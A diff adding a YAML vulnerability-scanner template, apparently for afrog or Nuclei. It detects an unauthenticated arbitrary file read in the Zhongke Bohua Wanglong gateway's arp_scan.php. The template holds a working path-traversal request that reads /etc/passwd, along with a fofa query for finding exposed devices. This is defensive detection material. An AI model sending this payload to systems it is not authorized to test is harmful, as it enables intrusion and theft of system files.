@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - sshd:x
+          - /sbin/nologin
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/firewall/arp_scan.php?ifname=/../../../../../etc/passwd'
+id: bohuawanglong-arp-scan-fileread
+info:
+  author: Superhero
+  description: |-
+    fofa: title="博华网龙"
+    中科博华网龙网关 arp_scan.php 任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 中科博华网龙网关 arp_scan.php 任意文件读取漏洞
+  severity: high
+  tags: bohuawanglong,fileread,arpscan,argus-import
